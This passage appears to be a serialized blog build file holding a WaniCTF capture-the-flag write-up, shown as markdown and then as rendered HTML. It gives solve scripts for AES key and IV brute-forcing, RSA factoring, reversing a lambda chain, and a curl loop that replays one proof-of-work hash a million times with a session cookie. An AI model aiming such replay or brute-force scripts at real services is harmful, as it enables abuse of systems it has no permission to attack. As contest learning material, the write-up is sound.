b'\\x16\\x97,\\xa7\\xfb_\\xf3\\x15.\\x87jKRaF&\"\\xb6\\xc4x\\xf4.K\\xd77j\\xe5MLI_y\\xd96\\xf1$\\xc5\\xa3\\x03\\x990Q^\\xc0\\x17M2\\x18'\nflag_hash = 6a96111d69e015a07e96dcd141d31e7fc81c4420dbbef75aef5201809093210e\n```\n\nSo here's our solution: We iterate through all potential 255 bytes for both the key and iv and check if the flag is encrypted. \n\nHere's our solve script:\n\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad, pad\nimport hashlib\n\n# Given encrypted data and original key/iv with appended bytes\nenc = b'\\x16\\x97,\\xa7\\xfb_\\xf3\\x15.\\x87jKRaF&\"\\xb6\\xc4x\\xf4.K\\xd77j\\xe5MLI_y\\xd96\\xf1$\\xc5\\xa3\\x03\\x990Q^\\xc0\\x17M2\\x18'  # Example encrypted data\noriginal_key = b'the_enc_key_is_'\noriginal_iv = b'my_great_iv_is_'\n\n# Original flag and its hash\nflag_hash = \"6a96111d69e015a07e96dcd141d31e7fc81c4420dbbef75aef5201809093210e\"\n\n# Brute-force through all possible key and iv combinations\nfor key_byte in range(256):\n    for iv_byte in range(256):\n        # Append the guessed byte to the original key and iv\n        key = original_key + bytes([key_byte])\n        iv = original_iv + bytes([iv_byte])\n\n        # Create AES cipher object\n        cipher = AES.new(key, AES.MODE_CBC, iv)\n\n        try:\n            # Decrypt the encrypted data\n            decrypted_data = cipher.decrypt(enc)\n\n            # Unpad the decrypted data\n            plaintext = unpad(decrypted_data, AES.block_size)\n\n            # Calculate SHA-256 hash of the plaintext\n            sha256_hash = hashlib.sha256(plaintext).hexdigest()\n\n            # Compare with original flag hash\n            if sha256_hash == flag_hash:\n                print(f\"Decrypted flag: {plaintext.decode('utf-8')}\")\n                print(f\"Guessed Key: {key}\")\n                print(f\"Guessed IV: {iv}\")\n                break  # Exit the loop if flag is found\n\n        except ValueError:\n            # Incorrect decryption (padding error), continue to next key/iv combination\n            continue\n\n    else:\n        continue  # Continue outer loop if flag not found\n    break  # Exit outer loop if flag is found\n```\n\n#### Beginner RSA\n\n> Do you know RSA?\n\nLet's look at the source code provided:\n\n```python\nfrom Crypto.Util.number import *\n\np = getPrime(64)\nq = getPrime(64)\nr = getPrime(64)\ns = getPrime(64)\na = getPrime(64)\nn = p*q*r*s*a\ne = 0x10001\n\nFLAG = b'FLAG{This_is_a_fake_flag}'\nm = bytes_to_long(FLAG)\nenc = pow(m, e, n)\nprint(f'n = {n}')\nprint(f'e = {e}')\nprint(f'enc = {enc}')\n```\n```bash\nn = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347\ne = 65537\nenc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265\n```\n\nWe can see 5 primes are used in our encryption. Interesting. \n\nSince the factors are all small, we can just go to factorDB and get the factors using the composite number `n`. We then can create a private key that will decrypt the encrypted `enc`\n\nHere's the solve script:\n\n```python\ndef inverse(x, m):\n  a, b, u = 0, m, 1\n  while x > 0:\n    q = b // x\n    x, a, b, u = b % x, u, x, a - q * u\n  if b == 1:\n    return a % m\nn = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347\ne = 65537\nenc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265\n\np = 9953162929836910171\nq = 11771834931016130837\nr = 12109985960354612149\ns = 13079524394617385153\na = 17129880600534041513\n\nfactors = [9953162929836910171, 11771834931016130837, 12109985960354612149, 13079524394617385153, 17129880600534041513]\nphi = 1\nfor p in factors:\n    phi *= (p - 1)\nd = inverse(e, phi)\nM = bytes.fromhex(hex(pow(enc, d,n))[2:]).decode()\nprint(M)\n#https://ctftime.org/writeup/21831\n```\n\n## Web Exploitatoin\n#### Bad Worker\n\n> オフラインで動くウェブアプリをつくりました。 We created a web application that works offline. https://web-bad-worker-lz56g6.wanictf.org\n\nThis one was kind of confusing. Looking into the web app, we can see that theres a route that will fetch `flag.txt`\n\nHowever, when we try to interact by requesting it in the web server we get nothing! Even downloading the web app offline doesn't do anything!\n\nHowever, you can just try to request the file `flag.txt` yourself, which does yield the flag.\n\n```bash\nwget https://web-bad-worker-lz56g6.wanictf.org/FLAG.txt\n```\n\n#### pow\n\n> compute hash to get your flag\n> ハッシュを計算してフラグを取ろう\n\nUpon visiting the website, we can see that hashes are being 'computed', but we need 1,000,000 to get the flag. \n\nIN NO WAY ON EARTH I AM WAITING TO COMPUTE 1000000 HASHES. LET'S GET LAZY.\n\nSo the hashes computed is sent as a post request, but you can intentionally send the same hash and it counts as a hash, increasing the computed hash count.\n\nSo what we can do is repeatedly send the same hash to the server until 1000000 hashes are computed. My solve script was really messy, but it did the job.\n\n```bash\n#!/bin/bash\n\n# Define the URL for the curl request\n\n# Number of times to repeat the curl request\nREPEAT_TIMES=1000000\n\n# Loop to repeat curl request\nfor (( i=1; i\u003C=$REPEAT_TIMES; i++ ))\ndo\n    # Perform curl request (adjust options as needed)\n    curl 'https://web-pow-lz56g6.wanictf.org/api/pow' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Referer: https://web-pow-lz56g6.wanictf.org/' -H 'Origin: https://web-pow-lz56g6.wanictf.org' -H 'Connection: keep-alive' -H 'Cookie: pow_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJjYmNlZGI1OS1iOGQ1LTRkYmMtOGYyZC1iNTAyOWY3NzI1MzUifQ.yKnE98ZeLTmQ7YRgZkRUkk2bocPV8eurrm8gTgxRg6M' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: no-cors' -H 'Sec-Fetch-Site: same-origin' -H 'TE: trailers' -H 'Content-Type: application/json' -H 'Alt-Used: web-pow-lz56g6.wanictf.org' -H 'Priority: u=4' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw '[\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\",\"2862152\", ...]\n sleep 1\ndone\n```\n\n## Reverse Engineering\n#### lambda\n> Let's dance with lambda!\n\nLet's look at the source code we have to decrypt. \n\n```python\nimport sys\n\nsys.setrecursionlimit(10000000)\n\n(lambda _0: _0(input))(lambda _1: (lambda _2: _2('Enter the flag: '))(lambda _3: (lambda _4: _4(_1(_3)))(lambda _5: (lambda _6: _6(''.join))(lambda _7: (lambda _8: _8(lambda _9: _7((chr(ord(c) + 12) for c in _9))))(lambda _10: (lambda _11: _11(''.join))(lambda _12: (lambda _13: _13((chr(ord(c) - 3) for c in _10(_5))))(lambda _14: (lambda _15: _15(_12(_14)))(lambda _16: (lambda _17: _17(''.join))(lambda _18: (lambda _19: _19(lambda _20: _18((chr(123 ^ ord(c)) for c in _20))))(lambda _21: (lambda _22: _22(''.join))(lambda _23: (lambda _24: _24((_21(c) for c in _16)))(lambda _25: (lambda _26: _26(_23(_25)))(lambda _27: (lambda _28: _28('16_10_13_x_6t_4_1o_9_1j_7_9_1j_1o_3_6_c_1o_6r'))(lambda _29: (lambda _30: _30(''.join))(lambda _31: (lambda _32: _32((chr(int(c,36) + 10) for c in _29.split('_'))))(lambda _33: (lambda _34: _34(_31(_33)))(lambda _35: (lambda _36: _36(lambda _37: lambda _38: _37 == _38))(lambda _39: (lambda _40: _40(print))(lambda _41: (lambda _42: _42(_39))(lambda _43: (lambda _44: _44(_27))(lambda _45: (lambda _46: _46(_43(_45)))(lambda _47: (lambda _48: _48(_35))(lambda _49: (lambda _50: _50(_47(_49)))(lambda _51: (lambda _52: _52('Correct FLAG!'))(lambda _53: (lambda _54: _54('Incorrect'))(lambda _55: (lambda _56: _56(_41(_53 if _51 else _55)))(lambda _57: lambda _58: _58)))))))))))))))))))))))))))\n```\n\nWow. Very messy. But don't get scared. We can simply just split this into smaller parts, and reverse the operations to get the flag.\n\nHere's the solution script:\n\n```python\nimport sys\n\nsys.setrecursionlimit(10000000)\n\n(lambda _0: _0(input))\n(lambda _1: (lambda _2: _2('Enter the flag: '))\n\n(lambda _3: (lambda _4: _4(_1(_3)))\n(lambda _5: (lambda _6: _6(''.join))\n#\n(lambda _7: (lambda _8: _8(lambda _9: _7((chr(ord(c) + 12) for c in _9))))\n(lambda _10: (lambda _11: _11(''.join))\n(lambda _12: (lambda _13: _13((chr(ord(c) - 3) for c in _10(_5))))\n(lambda _14: (lambda _15: _15(_12(_14)))\n(lambda _16: (lambda _17: _17(''.join))\n(lambda _18: (lambda _19: _19(lambda _20: _18((chr(123 ^ ord(c)) for c in _20))))\n(lambda _21: (lambda _22: _22(''.join))\n(lambda _23: (lambda _24: _24((_21(c) for c in _16)))\n(lambda _25: (lambda _26: _26(_23(_25)))\n(lambda _27: (lambda _28: _28('16_10_13_x_6t_4_1o_9_1j_7_9_1j_1o_3_6_c_1o_6r'))\n(lambda _29: (lambda _30: _30(''.join))\n(lambda _31: (lambda _32: _32((chr(int(c,36) + 10) for c in _29.split('_'))))\n(lambda _33: (lambda _34: _34(_31(_33)))(lambda _35: (lambda _36: _36(lambda _37: lambda _38: _37 == _38))\n(lambda _39: (lambda _40: _40(print))(lambda _41: (lambda _42: _42(_39))\n(lambda _43: (lambda _44: _44(_27))\n(lambda _45: (lambda _46: _46(_43(_45)))\n(lambda _47: (lambda _48: _48(_35))(lambda _49: (lambda _50: _50(_47(_49)))\n(lambda _51: (lambda _52: _52('Correct FLAG!'))\n(lambda _53: (lambda _54: _54('Incorrect'))(lambda _55: (lambda _56: _56(_41(_53 if _51 else _55)))(lambda _57: lambda _58: _58)))))))))))))))))))))))))))\n\n#something plus twelve\n\n#something -3 \n\n#something xor\n\n\nstuff = \"16_10_13_x_6t_4_1o_9_1j_7_9_1j_1o_3_6_c_1o_6r\" #this is what we have\nstuff = stuff.split('_')\nstuff = [chr(int(c,36)+ 10) for c in stuff]\nstuff = [chr(ord(c) ^ 123) for c in stuff]\nstuff = [chr(ord(c)+3) for c in stuff]\nstuff = [chr(ord(c)-12) for c in stuff]\nprint(''.join(stuff))\n```\n","src/content/blog/wanictf.md","1e3ab0cfe98af51c",{"html":236,"metadata":237},"\u003Ch1 id=\"background-information\">Background Information\u003C/h1>\n\u003Cp>I went to this competition as perpendicular pineapples. Could only do some of the challenges, which were mostly the beginner ones.\u003C/p>\n\u003Ch2 id=\"cryptography\">Cryptography\u003C/h2>\n\u003Ch4 id=\"beginner-aes\">Beginner AES\u003C/h4>\n\u003Cblockquote>\n\u003Cp>AES is one of the most important encryption methods in our daily lives.\u003C/p>\n\u003C/blockquote>\n\u003Cp>Let’s look at the provided code that encrypts the flag.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> Crypto\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">Util\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">Padding \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pad\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> Crypto\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">Cipher \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\"> AES\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> os \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> urandom\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> hashlib\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">key \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">the_enc_key_is_\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">iv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">my_great_iv_is_\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">key \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> urandom\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">iv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> urandom\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">cipher \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\"> AES\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">new\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">key\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> AES.MODE_CBC\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> iv\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\">FLAG\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> =\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">FLAG{This_is_a_dummy_flag}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">flag_hash \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> hashlib\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">sha256\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">FLAG\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">).\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">hexdigest\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">msg \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> pad\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">FLAG\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 16\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">enc \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> cipher\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">encrypt\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">msg\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'enc = \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">enc\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\"> #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> bytes object\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'flag_hash = \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">flag_hash\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\"> #\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> str object\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So we can see that the last character in both key and iv are random, and we can also see that the flag is encrypted using AES.\u003C/p>\n\u003Cp>We are also provide a \u003Ccode>out.txt\u003C/code> file, which has the encrypted flag as well as the hash of the flag\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">enc\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> =\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\\x16\\x97,\\xa7\\xfb_\\xf3\\x15.\\x87jKRaF&#x26;\"\\xb6\\xc4x\\xf4.K\\xd77j\\xe5MLI_y\\xd96\\xf1$\\xc5\\xa3\\x03\\x990Q^\\xc0\\x17M2\\x18\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">flag_hash\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> =\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> 6a96111d69e015a07e96dcd141d31e7fc81c4420dbbef75aef5201809093210e\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So here’s our solution: We iterate through all potential 255 bytes for both the key and iv and check if the flag is encrypted.\u003C/p>\n\u003Cp>Here’s our solve script:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> Crypto\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">Cipher \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\"> AES\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> Crypto\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">Util\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">Padding \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> unpad\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pad\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> hashlib\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Given encrypted data and original key/iv with appended bytes\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">enc \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\x16\\x97\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\xa7\\xfb\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">_\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\xf3\\x15\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">.\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\x87\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">jKRaF&#x26;\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\xb6\\xc4\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">x\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\xf4\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">.K\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\xd7\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">7j\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\xe5\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">MLI_y\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\xd9\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">6\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\xf1\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">$\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\xc5\\xa3\\x03\\x99\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">0Q^\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\xc0\\x17\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">M2\u003C/span>\u003Cspan 